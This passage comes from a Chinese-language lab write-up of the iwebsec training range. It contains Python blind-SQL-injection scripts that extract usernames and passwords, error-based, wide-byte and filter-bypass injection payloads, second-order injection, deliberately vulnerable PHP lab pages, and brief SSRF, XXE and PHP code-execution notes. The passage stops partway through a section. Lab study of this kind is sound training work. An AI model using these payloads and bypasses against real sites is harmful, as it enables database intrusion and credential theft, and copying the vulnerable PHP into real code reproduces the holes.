&quot;http://192.168.159.137/sqli/03.php?id=1 and ascii(substr((database()),&#123;0&#125;,1))=&#123;1&#125;--+&quot;.format(i,ord(j))</span><br><span class="line">        # 爆表</span><br><span class="line">        # url = &quot;http://192.168.159.137/sqli/03.php?id=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;iwebsec&#x27;),&#123;0&#125;,1))=&#123;1&#125;--+&quot;.format(i,ord(j))</span><br><span class="line">        # 爆列</span><br><span class="line">        # url = &quot;http://192.168.159.137/sqli/03.php?id=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),&#123;0&#125;,1))=&#123;1&#125;--+&quot;.format(i,ord(j))</span><br><span class="line">        # 爆数据</span><br><span class="line">        url = &quot;http://192.168.159.137/sqli/03.php?id=1 and ascii(substr((select group_concat(concat_ws(&#x27;~&#x27;,username,password)) from iwebsec.user),&#123;0&#125;,1))=&#123;1&#125;--+&quot;.format(i,ord(j))</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        if &#x27;welcome&#x27; in res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># @Author:refeng</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.159.137/sqli/03.php?id=1 and &quot;</span><br><span class="line"></span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line"></span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        #爆库</span><br><span class="line">        payload = f&quot;1=if(ascii(substr((select  database() limit 0,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) --+&quot;</span><br><span class="line">        #ascii(substr((select database() limit 0,1),&#123;i&#125;,1))：这部分是一个子查询，用来获取数据库名中第 &#123;i&#125; 个字符的 ASCII 值。</span><br><span class="line">        #爆表</span><br><span class="line">        # payload = f&quot;1=if(ascii(substr((select  group_concat(table_name) from information_schema.tables where table_schema=&#x27;iwebsec&#x27; limit 0,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) --+&quot;</span><br><span class="line">        #爆列</span><br><span class="line">        # payload = f&quot;1=if(ascii(substr((select  group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27; limit 0,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) --+&quot;</span><br><span class="line">        #爆数据</span><br><span class="line">        # payload = f&quot;1=if(ascii(substr((select  group_concat(concat_ws(&#x27;~&#x27;,username,password)) from iwebsec.user limit 0,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) --+&quot;</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        if &quot;welcome&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br><span class="line">?id=1 and if(1=1,sleep(5),1)  --+</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkL81KJ"><img src="https://s21.ax1x.com/2024/07/29/pkL81KJ.png" alt="pkL81KJ.png"></a></p><p>tip:head 和 tail 分别代表当前字符的 ASCII 可能取值范围的上限和下限。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><br>是右移位操作符，将数字向右移动指定的位数。1代表将数字向右移动一位，相当于除以2取整数部分。</p><h2 id="updatexml-函数（开报错注入了）"><a href="#updatexml-函数（开报错注入了）" class="headerlink" title="updatexml()函数（开报错注入了）"></a>updatexml()函数（开报错注入了）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(xml_doument,XPath_string,new_value)</span><br></pre></td></tr></table></figure><p>其中</p><blockquote><blockquote><p>xml_document是string格式，为xml文档对象的名称，文中为doc</p><p>XPath_string自己搜吧，写脚本的时候request的</p><p>new_value，string格式，替换查找到的符合条件的数据</p></blockquote></blockquote><p><a href="https://imgse.com/i/pkL8JV1"><img src="https://s21.ax1x.com/2024/07/29/pkL8JV1.png" alt="pkL8JV1.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1）爆库：?id=1 and updatexml(1,concat(0x5e,database(),0x5e),1) --+</span><br><span class="line">2）爆表：?id=1 and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema = &#x27;iwebsec&#x27; limit 0,1),0x5e),1) --+#limit中的数据可以改</span><br><span class="line">3）爆列：?id=1 and updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name = &#x27;sqli&#x27; limit 0,1),0x5e),1) --+</span><br><span class="line">另一种方式爆出来，最多一次爆出31个字符,n为可变数字：显示(n,n+31)的字符</span><br><span class="line">?id=1 and updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;sqli&#x27;),1),0x5e),n) --+</span><br><span class="line">如：显示第一个到第三十二个字符</span><br><span class="line">?id=1 and updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;sqli&#x27;),1),0x5e),1) --+</span><br><span class="line">4）爆数据：?id=1 and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from sqli),1)),0x5e),1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66a77f7ed9c307b7e92158a5.png" alt=""></p><ul><li>updatexml(1,concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name = ‘sqli’),1),0x5e),1):</li><li>updatexml: 这是MySQL的内置函数，用于更新XML数据。</li><li>1: 这是XML路径，指定要更新的XML数据中的位置。</li><li>concat(0x5e,substr((select group_concat(column_name) from information_schema.columns where table_name = ‘sqli’),1),0x5e):</li><li><ul><li>concat: 这是一个用于连接字符串的函数。</li></ul></li><li><ul><li>0x5e: 这是ASCII码中的插入符号“^”。</li></ul></li><li><ul><li>substr((select group_concat(column_name) from information_schema.columns where table_name = ‘sqli’),1): 这部分是一个SELECT语句，从information_schema.columns系统表中检索出表名为sqli的所有列名，并通过group_concat函数将这些列名连接成一个字符串。</li></ul></li><li><ul><li>1: 这是substr函数的第二个参数，表示从字符串的第一个字符开始截取。<br>整体上，这个部分构造了一个XML数据，其中包含了从表sqli的information_schema.columns中检索到的列名字符串。</li></ul></li><li>1: 这是XML的新值，即要更新的数据。</li></ul><h2 id="到了我们信心想念的宽字节"><a href="#到了我们信心想念的宽字节" class="headerlink" title="到了我们信心想念的宽字节"></a>到了我们信心想念的宽字节</h2><blockquote><blockquote><p>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。在使用PHP连接MySQL的时候，当设置“character_set_client = gbk”时会导致一个编码转换的问题，也就是我们熟悉的宽字节注入</p><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</p><p>GBK首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），例如%df和%5C会结合；GB2312是被GBK兼容的，它的高位范围是0xA1-0xF7，低位范围是0xA1-0xFE(0x5C不在该范围内)，因此不能使用编码吃掉%5c</p></blockquote></blockquote><p>如图<br><img src="https://pic.imgdb.cn/item/66a84a69d9c307b7e9ac3f4f.png" alt=""></p><p>图中将其转换为gbk，</p><p>注入也很简单，就是在字符型后面加了一个%df<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1）爆库</span><br><span class="line">?id=-1%df&#x27; union select 1,2,database() --+</span><br><span class="line">2）爆表</span><br><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563 --+</span><br><span class="line">0x69776562736563：iwebsec的十六进制编码</span><br><span class="line">3）爆列</span><br><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572--+</span><br><span class="line">0x75736572：user的十六进制编码</span><br><span class="line">4）爆数据</span><br><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user--+</span><br></pre></td></tr></table></figure></p><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  require_once(&#x27;../header.php&#x27;);</span><br><span class="line">  require_once(&#x27;db.php&#x27;);</span><br><span class="line">  ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;空格过滤&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;空格过滤&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/07.php?id=1 &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">  &lt;?php</span><br><span class="line">  if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">        if (preg_match(&#x27;/ /&#x27;, $_GET[&quot;id&quot;])) &#123;</span><br><span class="line">                die(&quot;ERROR&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">                $sql=&quot;SELECT * FROM user WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">                $result=mysql_query($sql);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($result) &#123;</span><br><span class="line">                ?&gt;</span><br><span class="line">                &lt;table class=&#x27;table table-striped&#x27;&gt;</span><br><span class="line">      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line">                while ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">                        echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">                        echo &quot;&lt;td&gt;&quot;.$row[&#x27;id&#x27;].&quot;&lt;/td&gt;&quot;;</span><br><span class="line">                        echo &quot;&lt;td&gt;&quot;.$row[&#x27;username&#x27;].&quot;&lt;/td&gt;&quot;;</span><br><span class="line">                        echo &quot;&lt;td&gt;&quot;.$row[&#x27;password&#x27;].&quot;&lt;/td&gt;&quot;;</span><br><span class="line">                        echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                echo &quot;&lt;/table&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else </span><br><span class="line">        &#123;</span><br><span class="line">//      echo &#x27;&lt;font color= &quot;#FFFFFF&quot;&gt;&#x27;;</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">//      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>想法就是强制制造空格<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1）/*%0a*//**/强行制造空格</span><br><span class="line">2）%a0代替空格</span><br><span class="line">3）%0a,%0d,%0b,/%0a/</span><br></pre></td></tr></table></figure></p><p>payload：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?id=1/**/and/**/1=1/**/#</span><br><span class="line">爆库</span><br><span class="line">?id=-1/**/union/**/select/**/1,2,database()#</span><br><span class="line">爆表</span><br><span class="line">?id=-1%0dunion%0dselect%0d1,2,group_concat(table_name)%0dfrom%0dinformation_schema.tables%0dwhere%0dtable_schema=0x69776562736563#</span><br><span class="line">爆列</span><br><span class="line">?id=-1%a0union%a0select%a01,2,group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=0x75736572#</span><br><span class="line">爆数据</span><br><span class="line">?id=-1/**/union/**/select/**/1,2,group_concat(concat_ws(0x7e,username,password))/**/from/**/iwebsec.user#</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>看源码是过滤了select ，但是没有过滤Select<br>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id=-1 union Select 1,2,database()#</span><br><span class="line">爆表</span><br><span class="line">?id=-1 union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563#</span><br><span class="line">爆列</span><br><span class="line">?id=-1 union Select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572#</span><br><span class="line">爆数据</span><br><span class="line">?id=-1 union Select 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user#</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>再上一个的基础上过滤了大小写<br>那么我可以双写绕</p><p><img src="https://pic.imgdb.cn/item/66a84d63d9c307b7e9aeaf9a.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id=-1 union seselectlect 1,2,database()#</span><br><span class="line">爆表</span><br><span class="line">?id=-1 union seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563#</span><br><span class="line">爆列</span><br><span class="line">?id=-1 union seselectlect 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572#</span><br><span class="line">爆数据</span><br><span class="line">?id=-1 union seselectlect 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user#</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="双重url绕过"><a href="#双重url绕过" class="headerlink" title="双重url绕过"></a>双重url绕过</h2><p><img src="https://pic.imgdb.cn/item/66a84d63d9c307b7e9aeafb8.png" alt=""></p><p>可以看到第一层过滤了select以及SELECT,然后用urldecode解码</p><p>我们正常上传到一次服务器会进行一次解码，这个就相当于再解码一次</p><p>所以这个题的payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">?id=-1 %25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34 1,2,database()#</span><br><span class="line">爆表</span><br><span class="line">?id=-1 %25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563#</span><br><span class="line">爆列</span><br><span class="line">?id=-1 %25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572#</span><br><span class="line">爆数据</span><br><span class="line">?id=-1 %25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user#</span><br></pre></td></tr></table></figure></p><h2 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h2><p>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1）爆库</span><br><span class="line">-1 union select 1,2,database()#</span><br><span class="line">2）爆表</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x69776562736563--+</span><br><span class="line">0x69776562736563：iwebsec的十六进制编码</span><br><span class="line">3）爆列</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572--+</span><br><span class="line">0x75736572：user的十六进制编码</span><br><span class="line">4）爆数据</span><br><span class="line">?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user--+</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="等价函数"><a href="#等价函数" class="headerlink" title="等价函数"></a>等价函数</h2><p>这个就有点不当人了，过滤了=<br><img src="https://pic.imgdb.cn/item/66a85291d9c307b7e9b29ca5.png" alt=""></p><p>有几个替换方案<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不加通配符的like执行的效果和=一致，所以可以用来绕过；</span><br><span class="line"></span><br><span class="line">rlike的用法和上面的like一样，没有通配符效果和=一样；</span><br><span class="line"></span><br><span class="line">regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</span><br><span class="line"></span><br><span class="line">&lt;&gt; 等价于 != ，所以在前面再加一个!结果就是等号了</span><br></pre></td></tr></table></figure></p><p>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1）爆库</span><br><span class="line">-1 union select 1,2,database()#</span><br><span class="line">2）爆表</span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x69776562736563--+</span><br><span class="line">0x69776562736563：iwebsec的十六进制编码</span><br><span class="line">3）爆列</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name like 0x75736572--+</span><br><span class="line">0x75736572：user的十六进制编码</span><br><span class="line">4）爆数据</span><br><span class="line">?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from iwebsec.user--+</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>这次是一个登录界面，但是看源码发现不存在注入</p><p><img src="https://pic.imgdb.cn/item/66a85291d9c307b7e9b29cb1.png" alt=""></p><p>因为sql语句仅仅使用了插入的insert，但是插入过程只进行了字符转义没有其他的过滤</p><p><img src="https://pic.imgdb.cn/item/66a85291d9c307b7e9b29cbf.png" alt=""></p><p>我们看一下重置界面，发现有一个<code>$username</code>的拼接，我们可以把sql语句放在这里</p><p>注册，尝试<code>admin&#39;#</code>密码随便输入，，然后去重置页面根据邮箱找回</p><p>爆出来了admin的账号密码<br><img src="https://pic.imgdb.cn/item/66a852dad9c307b7e9b2dd95.png" alt=""></p><p>输入<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(0x7e,database()),0)#</span><br></pre></td></tr></table></figure><br><img src="https://pic.imgdb.cn/item/66a852dad9c307b7e9b2ddac.png" alt=""></p><h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>ssrf就是对引用的ip没做限制导致的</p><p>不会的话看这篇<br><a href="https://blog.csdn.net/vodkaDL/article/details/114492348?spm=1001.2014.3001.5502">ssrf</a></p><h2 id="ssrf文件读取"><a href="#ssrf文件读取" class="headerlink" title="ssrf文件读取"></a>ssrf文件读取</h2><p><img src="https://pic.imgdb.cn/item/66a88619d9c307b7e9df7c77.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/66a88619d9c307b7e9df7c77.png" alt=""></p><h2 id="ssrf内网探测"><a href="#ssrf内网探测" class="headerlink" title="ssrf内网探测"></a>ssrf内网探测</h2><p><img src="https://pic.imgdb.cn/item/66a88619d9c307b7e9df7caa.png" alt=""></p><h2 id="ssrf内网应用"><a href="#ssrf内网应用" class="headerlink" title="ssrf内网应用"></a>ssrf内网应用</h2><p><img src="https://pic.imgdb.cn/item/66a8861ad9c307b7e9df7cbe.png" alt=""></p><h1 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h1><p>xxe外部实体注入漏洞</p><p>原理部分可以看这篇<a href="https://blog.csdn.net/weixin_44420143/article/details/118721145">xxe</a></p><p>有点抽象，但是我的理解就是xml的外部实体引入但是有没有对其进行过滤就导致了xxe漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  require_once(&#x27;../header.php&#x27;);</span><br><span class="line"></span><br><span class="line">  ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;XXE漏洞&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;XXE漏洞&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;input xml&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">  &lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line"></span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">if($xmlfile)&#123;</span><br><span class="line">        $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"></span><br><span class="line">        $creds = simplexml_import_dom($dom);</span><br><span class="line">        $username = $creds-&gt;username;</span><br><span class="line">        $password = $creds-&gt;password;</span><br><span class="line">&#125;</span><br><span class="line">        else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br><span class="line">                &lt;table class=&#x27;table table-striped&#x27;&gt;</span><br><span class="line"> </span><br><span class="line">                &lt;?php</span><br><span class="line">                echo &#x27;hello &#x27; . $username;</span><br><span class="line"></span><br><span class="line">                echo &quot;&lt;/table&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个明显是有一个file_get_contents函数引用了php://input的东西并且没做任何的过滤就应用了，并且在其中运用了username，，试了试xxe但是一直在这个地方，怪了</p><p><a href="https://pic.imgdb.cn/item/66a88f7cd9c307b7e9e8c355.png">https://pic.imgdb.cn/item/66a88f7cd9c307b7e9e8c355.png</a></p><p>一会去xxe-labs打吧，这里的xxe跳了</p><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><p>就是单纯的代码执行，就和你传上一句话木马以后一个样子</p><h2 id="01-eval直接输出"><a href="#01-eval直接输出" class="headerlink" title="01 eval直接输出"></a>01 eval直接输出</h2><p>eval() 函数把字符串按照 PHP 代码来计算。<br>该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1=phpinfo();</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="https://pic.imgdb.cn/item/66a8904bd9c307b7e9e96db5.png" alt=""></p><h2 id="02-assert"><a href="#02-assert" class="headerlink" title="02 assert"></a>02 assert</h2><p>assert函数其实是一个断言函数，断言函数用于在调试过程中捕捉程序的错误。“断言”在语文中的意思是“断定”、“十分肯定地说”，在编程中是指对某种假设条件进行检测，如果条件成立就不进行任何操作，如果条件不成立就捕捉到这种错误，并打印出错误信息，终止程序执行。<br>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>注意assert的一句话mua，不需要以分号结尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1=phpinfo();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66a890efd9c307b7e9e9f05d.png" alt=""></p><h2 id="03-call-user-func"><a href="#03-call-user-func" class="headerlink" title="03 call_user_func"></a>03 call_user_func</h2><p>call_user_func()是调用回调函数，可以将把一个参数作为回调函数的参数</p><p><img src="https://pic.imgdb.cn/item/66a8921cd9c307b7e9eadcb0.png" alt=""></p><p>上面都告诉你咋写了</p><p><img src="https://pic.imgdb.cn/item/66a892c8d9c307b7e9eb6960.png" alt=""></p><h2 id="04-call-user-func-array"><a href="#04-call-user-func-array" class="headerlink" title="04 call_user_func_array"></a>04 